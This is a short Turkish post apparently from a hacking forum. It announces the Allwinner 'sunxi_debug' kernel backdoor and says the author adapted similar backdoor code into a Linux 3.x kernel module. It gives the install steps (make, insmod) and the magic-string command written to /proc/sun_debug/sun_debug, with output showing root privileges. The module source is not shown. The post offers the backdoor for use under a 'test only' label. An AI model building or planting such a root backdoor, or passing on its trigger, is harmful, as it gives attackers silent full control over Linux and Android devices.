
Allwinner ARM işlemcileri için geçerli olan bir kernel-backdoor(arkakapı) gün yüzüne çıktı.

Bilgi için aşağıdaki adresi inceleyebilirsiniz.
http://thehackernews.com/2016/05/android-kernal-exploit.html

Arkakapı: "Sunxi_debug.c" isimli dosya tarafından oluşturulmaktadır.

Bu koddan yola çıkarak "Sunxi_debug.c" benzeri arkakapı oluşturan kod derledim.
Linux Kernel 3.x için gerekli düzenlemeleri yaptım.
Kod arkakapı oluşturmaktadır.
Muhtemelen Kernel 4.x içinde derlenebilir.

Testler olumlu.

Sadece Test amaçlı kod düzenlemesi yapılmıştır.
Kendisini geliştirmek isteyen arkadaşlar kodu inceleyebilir.

  /proc dosya sistemi içerisinde "sun_debug" dizini ve root dokunuşu için yine
"sun_debug" dosyası oluşturur.

  "Sunxi_debug.c" dakikalar içerisinde incelenip, dakikalar içerisinde de Linux Kernel için adapte
edilip, derlenecek hale getirilmiştir. 

Kusur için Affola...



------KURULUM İŞLEMİ------

# make

# insmod sun.ko



---------r00t yetkisi için-----------------------

$ echo "rootmydevice" > /proc/sun_debug/sun_debug

$ id
uid=0(root) gid=0(root) groups=0(root)


//////

Analiz
analiz@safe-mail.net

//////

